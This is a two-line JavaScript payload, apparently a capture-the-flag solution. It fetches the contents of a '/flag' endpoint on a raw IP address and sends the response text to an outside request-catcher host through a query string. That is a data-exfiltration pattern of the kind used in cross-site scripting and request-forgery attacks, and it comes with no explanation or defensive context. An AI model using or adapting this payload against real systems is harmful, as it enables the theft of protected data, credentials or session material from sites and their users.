const url = "http://165.232.190.5:2030/flag";
fetch(url).then((response) => response.text()).then((text) => fetch("https://omnigodzzz.free.beeceptor.com/?flag="+text));
